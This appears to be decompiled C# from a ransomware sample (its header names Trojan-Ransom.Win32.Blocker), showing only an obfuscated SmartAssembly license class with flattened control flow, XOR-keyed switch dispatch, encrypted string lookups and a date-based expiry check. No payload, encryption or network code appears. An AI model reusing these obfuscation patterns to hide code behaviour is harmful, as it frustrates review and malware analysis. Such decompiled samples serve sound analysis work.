// Decompiled with JetBrains decompiler
// Type: SmartAssembly.License.License
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SmartAssembly.License
{
  public class License
  {
    public static bool Validate()
    {
      try
      {
        bool flag;
        try
        {
          flag = SmartAssembly.License.License.Ⴗ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
        return flag;
      }
      catch (Exception ex)
      {
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o1 = (ValueType) flag;
        StackFrameHelper.CreateException1(ex, (object) o1);
        throw;
      }
    }

    public static void ValidateDLL()
    {
      try
      {
        try
        {
          SmartAssembly.License.License.Ⴗ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    private static bool Ⴗ()
    {
      int num;
      DateTime dateTime;
      try
      {
        bool flag;
        try
        {
          num = 4;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 6:
                num = SimpleZip.ႤႼ.Ⴀ(UsageReportSender.Ⴈ(718, 732), dateTime, 672, 679) ? 1 : 5;
                continue;
              case 1:
              case 3:
                goto label_5;
              case 2:
                goto label_6;
              case 5:
                num = !SecurityExceptionEventArgs.Ⴀ(UsageReportSender.Ⴈ(130, 144), DoNotEncodeStringsAttribute.Ⴍ(ref dateTime, -21.0, 248, 133), 139, 150) ? 2 : 1;
                continue;
              default:
                dateTime = DoNotObfuscateTypeAttribute.Ⴗ(Ⴈ.ႳႷ.Ⴗ(2059790446, 7), 27, 11);
                goto case 0;
            }
          }
label_5:
          throw new Exception(Ⴈ.Ⴀ.Ⴐ(1468303677, 8));
label_6:
          if (Ⴈ.Ⴓ.Ⴍ() == null)
          {
            try
            {
              SmartAssembly.License.License.Ⴗ();
            }
            catch
            {
            }
          }
          flag = true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<DateTime> o1 = (ValueType) dateTime;
          StackFrameHelper.CreateException1(ex, (object) o1);
          throw;
        }
        return flag;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> o1 = (ValueType) dateTime;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o2 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    private static void Ⴗ()
    {
      try
      {
        try
        {
          Ⴈ.Ⴅ.Ⴍ(SimpleZip.Ⴓ(661403122, 8), 550, 557);
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    public License()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static License()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static DialogResult Ⴓ([In] Form obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 123:
            num2 = 3;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = 0;
              continue;
            case 3:
            case 7:
              goto label_8;
            case 4:
            case 5:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.License.License.Ⴓ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.ShowDialog();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Form o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴀ([In] Control obj0, [In] Padding obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
            case 5:
              goto label_7;
            case 2:
              num1 = 4;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 108:
                  num2 = 3;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Padding = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Padding> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static void Ⴅ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 1;
              continue;
            case 3:
              goto label_7;
            case 4:
              goto label_8;
            case 5:
              goto label_10;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 87:
                  num2 = 3;
                  break;
                default:
                  num2 = 0;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_10:
        return;
label_7:
        obj0.Text = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        string o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static int Ⴈ([In] float obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 20:
            num2 = 3;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              goto label_3;
            case 1:
            case 5:
              num1 = 2;
              continue;
            case 3:
              goto label_8;
            case 6:
            case 7:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.License.License.Ⴈ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return Convert.ToInt32(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<float> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static bool Ⴄ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 45:
            num2 = 3;
            break;
          case 46:
            num2 = 8;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              num1 = 2;
              continue;
            case 1:
            case 6:
              num1 = 2;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_9;
            case 7:
            case 8:
              goto label_10;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.License.License.Ⴄ);
              num1 = 2;
              continue;
          }
        }
label_9:
        return obj0.EndsWith(obj1);
label_10:
        return obj0 != obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }
  }
}
